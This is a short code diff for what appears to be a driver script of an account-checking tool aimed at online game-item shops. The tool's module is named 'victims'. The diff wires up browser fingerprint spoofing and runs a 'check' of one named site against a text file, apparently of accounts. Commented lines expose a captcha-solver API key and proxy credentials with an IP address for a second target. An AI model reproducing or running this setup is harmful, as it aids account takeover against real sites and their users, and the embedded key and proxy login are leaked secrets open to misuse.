@@ -1,11 +1,15 @@
-# from victims import shoptridung
-# from chrome_fingerprints import FingerprintGenerator
+from victims import *
+from chrome_fingerprints import FingerprintGenerator
+
+
+fp_gen = FingerprintGenerator()
+victim = bidaithanroblox(None)
+victim.check('bidaithanroblox.txt', victim.get_items)
 
 # import capsolver
 # capsolver.api_key = "CAP-FFE2271E0A6E1961C4FB2BF717C81F0D"
 
 
-# fp_gen = FingerprintGenerator()
 # victim = shoptridung('brZgipEN:OvBNcLMk@171.235.160.120:21001', fp_gen)
 # victim.run()
 
